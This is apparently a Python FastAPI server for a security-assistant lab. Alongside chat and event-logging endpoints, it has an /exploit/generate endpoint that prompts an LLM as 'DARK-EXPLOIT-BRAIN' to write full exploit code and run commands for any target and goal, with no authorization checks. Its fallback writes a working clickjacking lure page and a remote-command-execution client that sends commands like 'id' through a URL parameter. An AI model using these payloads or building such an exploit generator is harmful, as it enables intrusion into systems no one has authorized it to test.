# src/api/http.py
from __future__ import annotations

import os
import json
import uuid
import logging
import traceback
from datetime import datetime
from pathlib import Path
from time import time
from typing import Optional, List, Dict, Any, Iterable

from dotenv import load_dotenv
from fastapi import FastAPI, HTTPException, Request, Body, status
from fastapi.middleware.cors import CORSMiddleware

from src.api.schemas.schemas import (
    CreateTaskRequest,
    CreateTaskResponse,
    ReportResponse,
    ChatRequest,
    ChatResponse,
)
from src.api.schemas.schemas_learning import (
    OnlineLearningEventRequest,
    OnlineLearningEventResponse,
    OnlineLearningBulkRequest,
    OnlineLearningBulkResponse,
)
from src.core.models import Task, ConversationSummary
from src.core.planner import Planner
from src.core.executor import Executor
from src.core.paths import BASE_DIR
from src.learning.online_learning_client import OnlineLearningClient
from src.memory.chat_memory import ChatMemory
from src.security.audit import audit_log
from src.learning.online_learning_events import (
    OnlineLearningEventDispatcher,
    ChatTurnEvent,
    PipelineResultEvent,
)
from src.learning.schemas_online_learning import (
    IncomingOnlineLearningEvent,
    IncomingOnlineLearningResponse,
)
from src.llm.openai_client import LLMConfig, load_llm_config
from src.llm.router import create_advisor, detect_provider, get_router
from pydantic import BaseModel

# ============================================================
# Env & paths
# ============================================================

load_dotenv(BASE_DIR / ".env")

CONFIG_DIR: Path = BASE_DIR / "config"
REPORTS_DIR: Path = BASE_DIR / "data" / "reports"
CHAT_MEMORY_DIR: Path = BASE_DIR / "data" / "chat-memory"
DATA_DIR: Path = BASE_DIR / "data"

EVENTS_LOG_DIR: Path = BASE_DIR / "data" / "online-learning-events"
EVENTS_LOG_DIR.mkdir(parents=True, exist_ok=True)

DATASETS_DIR: Path = BASE_DIR / "data" / "online-learning-datasets"
DATASETS_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# Logging
# ============================================================

def setup_logging() -> None:
    """
    Logging controlled by env:
      LOG_LEVEL=DEBUG|INFO|WARNING|ERROR
      LOG_TO_FILE=1
    """
    level_name = os.getenv("LOG_LEVEL", "INFO").upper()
    level = getattr(logging, level_name, logging.INFO)

    handlers: List[logging.Handler] = []

    console = logging.StreamHandler()
    console.setLevel(level)
    handlers.append(console)

    if os.getenv("LOG_TO_FILE", "").strip() in ("1", "true", "yes", "on"):
        log_file = BASE_DIR / "data" / "logs" / "api.log"
        log_file.parent.mkdir(parents=True, exist_ok=True)
        file_handler = logging.FileHandler(log_file, encoding="utf-8")
        file_handler.setLevel(level)
        handlers.append(file_handler)

    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=handlers,
    )


setup_logging()
logger = logging.getLogger(__name__)

# ============================================================
# FastAPI app
# ============================================================

app = FastAPI(title="Security Assistant GPT (Lab)")

origins = [
    "http://localhost:5173",
    "http://127.0.0.1:5173",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================
# Core components
# ============================================================

planner = Planner()
executor = Executor(
    reports_dir=REPORTS_DIR,
    config_dir=CONFIG_DIR,
)
chat_memory = ChatMemory(CHAT_MEMORY_DIR, max_messages=50)

# Central model/provider router (openai vs xai). Executor already builds its
# advisor through the same factory; helpers below re-resolve when a request
# overrides the model name.
_llm_router = get_router()


def _resolve_llm_advisor(model_override: Optional[str] = None) -> Any:
    """Return the LLM advisor for the default config or a per-request model.

    Public call sites keep using ``executor.llm_advisor`` when no override is
    needed. When a request supplies a different model, the router selects the
    matching client (and that client selects the matching prompt set).
    """
    base = executor.llm_advisor
    override = (model_override or "").strip()
    if not override:
        return base

    base_model = ""
    base_provider = None
    if base is not None and getattr(base, "config", None) is not None:
        base_model = str(getattr(base.config, "model", "") or "")
        base_provider = getattr(base.config, "provider", None)

    if override == base_model:
        return base

    if detect_provider(override, explicit=base_provider) == detect_provider(
        base_model, explicit=base_provider
    ):
        # Same provider: reuse the existing client instance (model name on
        # config may still differ; callers pass model_name for logging only).
        return base

    try:
        cfg = load_llm_config(CONFIG_DIR)
        cfg = LLMConfig(
            enabled=cfg.enabled,
            model=override,
            max_tokens=cfg.max_tokens,
            temperature=cfg.temperature,
            top_p=cfg.top_p,
            assistant_id=cfg.assistant_id,
            enable_planner=cfg.enable_planner,
            enable_web_search=cfg.enable_web_search,
            web_search_external_access=cfg.web_search_external_access,
            provider=None,  # re-detect from model
        )
        return create_advisor(cfg)
    except Exception as e:  # noqa: BLE001
        logger.warning(
            "[router] failed to resolve advisor for model=%s; falling back | error=%r",
            override,
            e,
        )
        return base

# ============================================================
# Online Learning Client wiring
# ============================================================

# .env:
# ONLINE_LEARNING_ENDPOINT=http://127.0.0.1:2121
# ONLINE_LEARNING_API_KEY=optional-token
online_learning_endpoint = os.getenv("ONLINE_LEARNING_ENDPOINT")
online_learning_api_key = os.getenv("ONLINE_LEARNING_API_KEY")

online_learning_client: Optional[OnlineLearningClient] = None
if online_learning_endpoint:
    online_learning_client = OnlineLearningClient(
        endpoint_url=online_learning_endpoint,
        api_key=online_learning_api_key,
        timeout=float(os.getenv("ONLINE_LEARNING_TIMEOUT", "5.0")),
        verify_ssl=os.getenv("ONLINE_LEARNING_VERIFY_SSL", "false").lower() in ("1", "true", "yes"),
    )
    logger.info(
        "[online-learning] client enabled | endpoint=%s",
        online_learning_endpoint,
    )
else:
    logger.warning("[online-learning] client disabled | ONLINE_LEARNING_ENDPOINT not set")

online_learning_dispatcher = OnlineLearningEventDispatcher(online_learning_client)

# ============================================================
# Helpers: dataset builder (from logged JSONL)
# ============================================================

def _iter_event_files(dir_path: Path) -> Iterable[Path]:
    for p in sorted(dir_path.glob("*.jsonl")):
        if p.is_file():
            yield p


def _read_jsonl(path: Path) -> Iterable[Dict[str, Any]]:
    with path.open("r", encoding="utf-8") as f:
        for line_no, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            try:
                yield json.loads(line)
            except Exception as e:  # noqa: BLE001
                logger.warning(
                    "[dataset] skip bad jsonl line | file=%s line=%d error=%r",
                    path.name,
                    line_no,
                    e,
                )


def build_online_learning_dataset_csv(
    *,
    events_dir: Path,
    output_path: Path,
    dedupe_by_event_id: bool = False,
) -> Path:
    """
    Build a simple CSV dataset from logged online-learning events.

    Output columns:
      - event_type
      - ts
      - received_ts
      - risk_score
      - payload_json
      - meta_json
      - source_file
    """
    import csv

    rows: List[Dict[str, Any]] = []
    seen_ids: set[str] = set()

    for file_path in _iter_event_files(events_dir):
        event_type_from_file = file_path.stem

        for obj in _read_jsonl(file_path):
            # event id heuristic
            evt_id = str(obj.get("id") or obj.get("event_id") or "")
            if dedupe_by_event_id and evt_id:
                if evt_id in seen_ids:
                    continue
                seen_ids.add(evt_id)

            rows.append(
                {
                    "event_type": obj.get("event_type") or event_type_from_file,
                    "ts": obj.get("ts"),
                    "received_ts": obj.get("received_ts"),
                    "risk_score": obj.get("risk_score"),
                    "payload_json": json.dumps(obj.get("payload") or {}, ensure_ascii=False),
                    "meta_json": json.dumps(obj.get("meta") or {}, ensure_ascii=False),
                    "source_file": file_path.name,
                }
            )

    output_path.parent.mkdir(parents=True, exist_ok=True)

    fieldnames = [
        "event_type",
        "ts",
        "received_ts",
        "risk_score",
        "payload_json",
        "meta_json",
        "source_file",
    ]

    with output_path.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fieldnames)
        w.writeheader()
        for r in rows:
            w.writerow(r)

    logger.info(
        "[dataset] csv built | path=%s rows=%d",
        output_path,
        len(rows),
    )
    return output_path


# ============================================================
# /chat: core chat endpoint
# ============================================================

@app.post("/chat")
async def chat(request: Request) -> Dict[str, Any]:
    data: Dict[str, Any] = await request.json()
    conversation_id: Optional[str] = data.get("conversation_id")
    raw_messages: List[Dict[str, Any]] = data.get("messages", [])
    # Optional per-request model → router picks openai vs xai client + prompts.
    advisor = _resolve_llm_advisor(data.get("model") if isinstance(data, dict) else None)

    if advisor is None or advisor.client is None or not getattr(advisor.config, "enabled", False):
        raise HTTPException(status_code=503, detail="LLM chat is disabled or unavailable.")

    new_messages: List[Dict[str, str]] = []
    for m in raw_messages:
        if not isinstance(m, dict):
            continue
        role = str(m.get("role", "user"))
        content = str(m.get("content", ""))
        if content:
            new_messages.append({"role": role, "content": content})

    if not new_messages:
        raise HTTPException(status_code=400, detail="No valid messages provided.")

    last_user_msg: Optional[Dict[str, str]] = None
    for m in reversed(new_messages):
        if m["role"] == "user":
            last_user_msg = m
            break
    if last_user_msg is None:
        last_user_msg = new_messages[-1]

    if not conversation_id:
        conversation_id = str(uuid.uuid4())
        history: List[Dict[str, str]] = []
    else:
        try:
            history = chat_memory.load_history(conversation_id) or []
        except Exception as e:
            logger.warning("[chat] failed to load history | id=%s error=%r", conversation_id, e)
            history = []

    if not isinstance(history, list):
        history = []

    llm_messages: List[Dict[str, str]] = history + [last_user_msg]

    try:
        reply_text: str = advisor.secure_chat(messages=llm_messages)
    except Exception as e:
        logger.exception("[chat] secure_chat failed | id=%s error=%r", conversation_id, e)
        raise HTTPException(status_code=500, detail=f"LLM chat failed: {e}")

    chat_memory.append_turn(
        conversation_id,
        user_msg=last_user_msg,
        assistant_msg={"role": "assistant", "content": reply_text},
    )

    audit_log(
        "chat_request",
        {
            "conversation_id": conversation_id,
            "num_history_messages": len(history),
            "uses_knowledge_file": False,
        },
    )

    # learning hook
    if online_learning_dispatcher is not None:
        try:
            from src.llm.model_config import get_chat_model

            evt = ChatTurnEvent(
                conversation_id=conversation_id,
                user_message=last_user_msg["content"],
                assistant_reply=reply_text,
                num_history_messages=len(history),
                model_name=(
                    getattr(advisor.config, "model_name", None)
                    or getattr(advisor.config, "model", None)
                    or get_chat_model()
                ),
                source="teacher_api.chat",
            )
            online_learning_dispatcher.send_chat_turn(evt)
        except Exception:
            logger.exception("[chat] learning dispatch failed | id=%s", conversation_id)

    return {"conversation_id": conversation_id, "reply": reply_text}


# ============================================================
# /conversations
# ============================================================

@app.get("/conversations")
async def list_conversations() -> Dict[str, Any]:
    summaries: List[ConversationSummary] = []

    for path in CHAT_MEMORY_DIR.glob("*.json"):
        conversation_id = path.stem

        try:
            history = chat_memory.load_history(conversation_id) or []
        except Exception as e:
            logger.warning("[conversations] load failed | id=%s error=%r", conversation_id, e)
            history = []

        if not isinstance(history, list):
            history = []

        theme = "conversation"
        keywords: List[str] = []

        num_messages = len(history)
        last_messages = history[-5:] if num_messages > 5 else history

        try:
            last_updated = datetime.fromtimestamp(path.stat().st_mtime)
        except Exception:
            last_updated = None

        summaries.append(
            ConversationSummary(
                conversation_id=conversation_id,
                theme=theme,
                keywords=keywords,
                num_messages=num_messages,
                last_updated=last_updated,
                last_messages=last_messages,
            )
        )

    summaries.sort(
        key=lambda s: (s.last_updated or datetime.fromtimestamp(0)),
        reverse=True,
    )

    return {"conversations": [s.model_dump() for s in summaries]}


# ============================================================
# Healthcheck
# ============================================================

@app.get("/health")
async def health() -> Dict[str, Any]:
    return {
        "status": "ok",
        "online_learning_enabled": online_learning_client is not None,
        "events_log_dir": str(EVENTS_LOG_DIR),
    }


# ============================================================
# Online Learning Proxy Endpoints
# ============================================================

@app.post(
    "/online-learning/events",
    response_model=OnlineLearningEventResponse,
    status_code=status.HTTP_200_OK,
)
async def send_online_learning_event(
    body: OnlineLearningEventRequest,
    request: Request,
) -> OnlineLearningEventResponse:
    if online_learning_client is None:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail="Online learning client is not configured.",
        )

    base_meta: Dict[str, Any] = {
        "remote_addr": request.client.host if request.client else None,
        "user_agent": request.headers.get("User-Agent"),
        "path": str(request.url.path),
    }

    merged_meta: Dict[str, Any] = dict(base_meta)
    if body.metadata:
        merged_meta.update(body.metadata)

    ok = online_learning_client.send_event(
        event_type=body.event_type,
        payload=body.payload,
        risk_score=body.risk_score,
        metadata=merged_meta,
    )

    audit_log(
        "online_learning_event",
        {
            "event_type": body.event_type,
            "risk_score": body.risk_score,
            "success": ok,
        },
    )

    if ok:
        return OnlineLearningEventResponse(
            success=True,
            status_code=status.HTTP_200_OK,
            message="Event delivered to online learning backend.",
        )

    raise HTTPException(
        status_code=status.HTTP_502_BAD_GATEWAY,
        detail="Failed to deliver event to online learning backend.",
    )


@app.post(
    "/online-learning/bulk",
    response_model=OnlineLearningBulkResponse,
    status_code=status.HTTP_200_OK,
)
async def send_online_learning_bulk(
    body: OnlineLearningBulkRequest,
    request: Request,
) -> OnlineLearningBulkResponse:
    if online_learning_client is None:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE,
            detail="Online learning client is not configured.",
        )

    sent = 0
    failed = 0

    for evt in body.events:
        base_meta: Dict[str, Any] = {
            "remote_addr": request.client.host if request.client else None,
            "user_agent": request.headers.get("User-Agent"),
            "path": str(request.url.path),
        }
        merged_meta: Dict[str, Any] = dict(base_meta)
        if evt.metadata:
            merged_meta.update(evt.metadata)

        ok = online_learning_client.send_event(
            event_type=evt.event_type,
            payload=evt.payload,
            risk_score=evt.risk_score,
            metadata=merged_meta,
        )
        if ok:
            sent += 1
        else:
            failed += 1

    audit_log(
        "online_learning_bulk",
        {
            "total": len(body.events),
            "sent": sent,
            "failed": failed,
        },
    )

    return OnlineLearningBulkResponse(
        success=failed == 0,
        sent=sent,
        failed=failed,
        message=f"Bulk send finished: sent={sent}, failed={failed}",
    )


# ============================================================
# OpenAI-compatible endpoint
# ============================================================

@app.post("/v1/chat/completions")
async def openai_compatible_chat(
    request: Request,
    body: Dict[str, Any] = Body(...),
) -> Dict[str, Any]:
    messages: List[Dict[str, Any]] = body.get("messages") or []
    from src.llm.model_config import get_chat_model

    model_name: str = (
        body.get("model")
        or getattr(getattr(executor.llm_advisor, "config", None), "model_name", None)
        or getattr(getattr(executor.llm_advisor, "config", None), "model", None)
        or get_chat_model()
    )
    # Router selects openai vs xai client (and that client selects prompt set).
    advisor = _resolve_llm_advisor(body.get("model"))

    if advisor is None or advisor.client is None or not getattr(advisor.config, "enabled", False):
        raise HTTPException(status_code=503, detail="LLM chat is disabled or unavailable.")

    conversation_id: Optional[str] = body.get("conversation_id") or request.headers.get(
        "X-Conversation-ID"
    )

    new_messages: List[Dict[str, str]] = []
    for m in messages:
        if not isinstance(m, dict):
            continue
        role = str(m.get("role", "user"))
        content = str(m.get("content", ""))
        if content:
            new_messages.append({"role": role, "content": content})

    if not new_messages:
        raise HTTPException(status_code=400, detail="No valid messages provided.")

    last_user_msg: Optional[Dict[str, str]] = None
    for m in reversed(new_messages):
        if m["role"] == "user":
            last_user_msg = m
            break
    if last_user_msg is None:
        last_user_msg = new_messages[-1]

    if not conversation_id:
        conversation_id = str(uuid.uuid4())
        history: List[Dict[str, str]] = []
    else:
        try:
            history = chat_memory.load_history(conversation_id) or []
        except Exception as e:
            logger.warning("[openai_chat] load history failed | id=%s error=%r", conversation_id, e)
            history = []

    if not isinstance(history, list):
        history = []

    llm_messages: List[Dict[str, str]] = history + [last_user_msg]

    try:
        reply_text: str = advisor.secure_chat(messages=llm_messages)
    except Exception as e:
        logger.exception("[openai_chat] secure_chat failed | id=%s error=%r", conversation_id, e)
        raise HTTPException(status_code=500, detail=f"LLM chat failed: {e}")

    chat_memory.append_turn(
        conversation_id,
        user_msg=last_user_msg,
        assistant_msg={"role": "assistant", "content": reply_text},
    )

    # learning hook (dispatcher)
    if online_learning_dispatcher is not None:
        try:
            evt = ChatTurnEvent(
                conversation_id=conversation_id,
                user_message=last_user_msg["content"],
                assistant_reply=reply_text,
                num_history_messages=len(history),
                model_name=model_name,
                source="teacher_api.openai_compatible_chat",
            )
            online_learning_dispatcher.send_openai_chat_turn(evt)
        except Exception:
            logger.exception("[openai_chat] learning dispatch failed | id=%s", conversation_id)

    audit_log(
        "chat_request_openai_style",
        {
            "conversation_id": conversation_id,
            "num_history_messages": len(history),
            "uses_knowledge_file": False,
        },
    )

    now = int(time())
    return {
        "id": conversation_id,
        "object": "chat.completion",
        "created": now,
        "model": model_name,
        "choices": [
            {
                "index": 0,
                "message": {"role": "assistant", "content": reply_text},
                "finish_reason": "stop",
            }
        ],
    }


# ============================================================
# Collector endpoint for OnlineLearningClient (darkworker side)
# ============================================================

@app.post(
    "/events",
    response_model=IncomingOnlineLearningResponse,
    status_code=status.HTTP_200_OK,
)
async def receive_online_learning_event(
    body: IncomingOnlineLearningEvent,
    request: Request,
) -> IncomingOnlineLearningResponse:
    remote_addr = request.client.host if request.client else None
    user_agent = request.headers.get("User-Agent")

    event_dict: Dict[str, Any] = body.model_dump()
    event_dict.setdefault("meta", {})
    event_dict["meta"]["remote_addr"] = remote_addr
    event_dict["meta"]["user_agent"] = user_agent
    event_dict["received_ts"] = time()

    event_type = body.event_type
    log_path = EVENTS_LOG_DIR / f"{event_type}.jsonl"

    try:
        with log_path.open("a", encoding="utf-8") as f:
            f.write(json.dumps(event_dict, ensure_ascii=False) + "\n")
    except Exception as e:
        logger.exception("[events] persist failed | type=%s error=%r", event_type, e)
        return IncomingOnlineLearningResponse(
            success=False,
            message=f"Failed to persist event: {e}",
        )

    logger.info(
        "[events] received",
        extra={"event_type": event_type, "remote_addr": remote_addr},
    )

    return IncomingOnlineLearningResponse(
        success=True,
        message="Event received and stored.",
    )


# ============================================================
# NEW: Build dataset from logged events
# ============================================================

@app.post("/online-learning/build-dataset")
async def build_online_learning_dataset(
    request: Request,
    body: Dict[str, Any] = Body(default={}),
) -> Dict[str, Any]:
    """
    Build a CSV from JSONL logs under data/online-learning-events/.

    Body options:
      - output_filename: str (default: online_learning_dataset.csv)
      - dedupe_by_event_id: bool (default: False)
    """
    output_filename = str(body.get("output_filename") or "online_learning_dataset.csv")
    dedupe_by_event_id = bool(body.get("dedupe_by_event_id") or False)

    output_path = DATASETS_DIR / output_filename

    try:
        csv_path = build_online_learning_dataset_csv(
            events_dir=EVENTS_LOG_DIR,
            output_path=output_path,
            dedupe_by_event_id=dedupe_by_event_id,
        )
    except Exception as e:
        logger.exception("[dataset] build failed | error=%r", e)
        raise HTTPException(status_code=500, detail=f"Dataset build failed: {e}")

    audit_log(
        "online_learning_build_dataset",
        {
            "output": str(csv_path),
            "dedupe_by_event_id": dedupe_by_event_id,
        },
    )

    return {
        "success": True,
        "output_path": str(csv_path),
        "events_dir": str(EVENTS_LOG_DIR),
    }

# ============================================================
# Exploit LLM models (for /exploit/generate)
# ============================================================

class ExploitLLMRequest(BaseModel):
    vuln_description: str
    target_stack: str
    exploit_goal: str
    constraints: Dict[str, Any] = {}


class ExploitLLMFile(BaseModel):
    path: str
    language: str
    code: str


class ExploitLLMResponse(BaseModel):
    exploit_files: List[ExploitLLMFile]
    run_instructions: List[str]
    notes: str


# ============================================================
# Exploit LLM endpoint (/exploit/generate) – OpenAI-backed
# ============================================================

def _synthesize_exploit_llm(req: ExploitLLMRequest) -> ExploitLLMResponse:
    """
    Core exploit LLM logic.

    - Uses OpenAILLMAdvisor.secure_chat to generate exploit JSON.
    - If JSON parsing fails or advisor is disabled, falls back to deterministic PoC.
    """
    from json import JSONDecodeError

    # Use the same advisor as /chat
    advisor = executor.llm_advisor
    if advisor is None or advisor.client is None or not getattr(advisor.config, "enabled", False):
        logger.warning("[exploit_llm] advisor disabled or unavailable, using local fallback.")
        return _synthesize_exploit_llm_fallback(req)

    # Build a strict JSON instruction for the model
    system_prompt = (
        "You are DARK-EXPLOIT-BRAIN, an automated exploit designer.\n\n"
        "You MUST respond with a single JSON object ONLY, no prose, no markdown.\n"
        "JSON schema:\n"
        "{\n"
        '  \"exploit_files\": [\n'
        "    {\"path\": \"exploits/<name>\", \"language\": \"python|bash|html|php|js|...\", \"code\": \"<full source>\"},\n"
        "    ...\n"
        "  ],\n"
        "  \"run_instructions\": [\"exact command to run PoC #1\", \"...\"],\n"
        "  \"notes\": \"short technical notes\"\n"
        "}\n\n"
        "Do NOT wrap JSON in; do NOT add comments; output pure JSON."
    )

    user_prompt = (
        "Exploit specification:\n"
        f"- Target stack: {req.target_stack}\n"
        f"- Vulnerability: {req.vuln_description}\n"
        f"- Exploit goal: {req.exploit_goal}\n"
        f"- Constraints: {req.constraints}\n\n"
        "Design the most effective exploit PoC(s) for this scenario and return them in the JSON schema above."
    )

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": user_prompt},
    ]

    try:
        raw = advisor.secure_chat(messages=messages, resource_name="exploit_llm")
    except Exception as e:
        logger.exception("[exploit_llm] secure_chat failed | error=%r", e)
        return _synthesize_exploit_llm_fallback(req)

    raw_str = raw.strip()
    logger.debug("[exploit_llm] raw model output: %s", raw_str[:500])

    # Try to parse JSON
    try:
        data = json.loads(raw_str)
    except JSONDecodeError as e:
        logger.warning("[exploit_llm] JSON decode failed (%r), using fallback.", e)
        return _synthesize_exploit_llm_fallback(req)

    # Validate and coerce into ExploitLLMResponse
    try:
        files_data = data.get("exploit_files", [])
        run_instructions = data.get("run_instructions", [])
        notes = data.get("notes", "")

        exploit_files: List[ExploitLLMFile] = []
        for f in files_data:
            path = str(f.get("path", "exploits/generated_poc.py"))
            language = str(f.get("language", "text"))
            code = str(f.get("code", ""))
            exploit_files.append(
                ExploitLLMFile(path=path, language=language, code=code)
            )

        if not isinstance(run_instructions, list):
            run_instructions = [str(run_instructions)]

        run_instructions = [str(x) for x in run_instructions]
        notes = str(notes)

        return ExploitLLMResponse(
            exploit_files=exploit_files,
            run_instructions=run_instructions,
            notes=notes,
        )
    except Exception as e:
        logger.warning("[exploit_llm] result coercion failed (%r), using fallback.", e)
        return _synthesize_exploit_llm_fallback(req)


def _synthesize_exploit_llm_fallback(req: ExploitLLMRequest) -> ExploitLLMResponse:
    """
    Deterministic fallback: clickjacking+header recon or generic RCE.
    """
    focus = (req.constraints.get("focus") or "").lower()
    source_url = req.constraints.get("source_url", "https://target.example.com")

    exploit_files: List[ExploitLLMFile] = []
    run_instructions: List[str] = []
    notes_parts: List[str] = []

    notes_parts.append(f"[fallback] Target stack: {req.target_stack}")
    notes_parts.append(f"[fallback] Vulnerability: {req.vuln_description}")
    notes_parts.append(f"[fallback] Goal: {req.exploit_goal}")
    notes_parts.append(f"[fallback] Constraints: {req.constraints}")

    if "clickjacking" in focus or "xss" in focus or "browser" in focus:
        from urllib.parse import urlparse

        parsed = urlparse(source_url)
        host = (parsed.netloc or parsed.path or "target").replace(":", "_").replace("/", "_")

        html_path = f"exploits/llm_clickjack_{host}.html"
        py_path = f"exploits/llm_headers_recon_{host}.py"

        html_code = f"""<!DOCTYPE html>
<html>
<head>
  <title>LLM Clickjacking PoC for {source_url}</title>
  <style>
    html, body {{
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: #000;
      color: #0f0;
      font-family: monospace;
    }}
    #victim-frame {{
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 0.01;
      z-index: 1;
      border: none;
    }}
    #lure-layer {{
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }}
    .fake-button {{
      padding: 20px 40px;
      border: 1px solid #0f0;
      background: #111;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 2px;
    }}
  </style>
</head>
<body>
  <iframe id="victim-frame" src="{source_url}"></iframe>
  <div id="lure-layer">
    <div class="fake-button">Click to claim your dev bonus</div>
  </div>
</body>
</html>
"""

        py_code = f"""#!/usr/bin/env python3
# {py_path}
import requests

TARGET = "{source_url}"

def fetch_headers(url: str):
    resp = requests.get(url, timeout=10, allow_redirects=True)
    return resp.url, resp.status_code, resp.headers

def classify_header_posture(headers: dict) -> dict:
    h = {{k.lower(): v for k, v in headers.items()}}
    posture = {{
        "frameable": False,
        "csp_weak": False,
        "cookies_weak": False,
        "referrer_leaky": False,
    }}

    xfo = h.get("x-frame-options", "")
    csp = h.get("content-security-policy", "")
    if ("deny" not in xfo.lower() and "sameorigin" not in xfo.lower()
        and "frame-ancestors" not in csp.lower()):
        posture["frameable"] = True

    if not csp or "unsafe-inline" in csp or "*" in csp:
        posture["csp_weak"] = True

    for ck in [v for k, v in headers.items() if k.lower() == "set-cookie"]:
        low = ck.lower()
        if "httponly" not in low or "secure" not in low:
            posture["cookies_weak"] = True
            break

    if "referrer-policy" not in h:
        posture["referrer_leaky"] = True

    return posture

if __name__ == "__main__":
    final_url, status, headers = fetch_headers(TARGET)
    posture = classify_header_posture(headers)
    print(f"[+] Final URL: {{final_url}} (HTTP {{status}})")
    print("[+] Header posture classification:")
    for k, v in posture.items():
        print(f"    - {{k}}: {{v}}")
"""

        exploit_files.append(ExploitLLMFile(path=html_path, language="html", code=html_code))
        exploit_files.append(ExploitLLMFile(path=py_path, language="python", code=py_code))

        run_instructions.append(f"python3 {py_path}")
        run_instructions.append(f"Host {html_path} and open it in a browser to test clickjacking.")

        notes_parts.append("[fallback] browser-side clickjacking + header recon PoC generated.")
    else:
        url = req.constraints.get("rce_url", "http://target/vuln.php")
        param = req.constraints.get("rce_param", "cmd")
        poc_path = "exploits/llm_generic_rce_poc.py"

        code = f"""#!/usr/bin/env python3
# {poc_path}
import sys
import requests

TARGET_URL = "{url}"
PARAM_NAME = "{param}"

def run_cmd(cmd: str):
    params = {{PARAM_NAME: cmd}}
    resp = requests.get(TARGET_URL, params=params, timeout=10)
    print("HTTP", resp.status_code)
    print(resp.text)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {{sys.argv[0]}} '<command>'")
        sys.exit(1)
    run_cmd(sys.argv[1])
"""
        exploit_files.append(ExploitLLMFile(path=poc_path, language="python", code=code))
        run_instructions.append(f"python3 {poc_path} 'id'")
        run_instructions.append(f"python3 {poc_path} 'whoami'")
        notes_parts.append("[fallback] generic RCE PoC generated.")

    notes = "\n".join(notes_parts)

    return ExploitLLMResponse(
        exploit_files=exploit_files,
        run_instructions=run_instructions,
        notes=notes,
    )


@app.post(
    "/exploit/generate",
    response_model=ExploitLLMResponse,
    status_code=status.HTTP_200_OK,
)
async def exploit_generate(
    body: ExploitLLMRequest,
    request: Request,
) -> ExploitLLMResponse:
    """
    Exploit LLM endpoint used by ExploitModeEngine._try_llm_generation().
    """
    try:
        resp = _synthesize_exploit_llm(body)
    except Exception as e:
        logger.exception("[exploit_generate] failed | error=%r", e)
        raise HTTPException(status_code=500, detail=f"Exploit generation failed: {e}")

    audit_log(
        "exploit_generate",
        {
            "remote_addr": request.client.host if request.client else None,
            "goal": body.exploit_goal,
            "target_stack": body.target_stack,
        },
    )

    return resp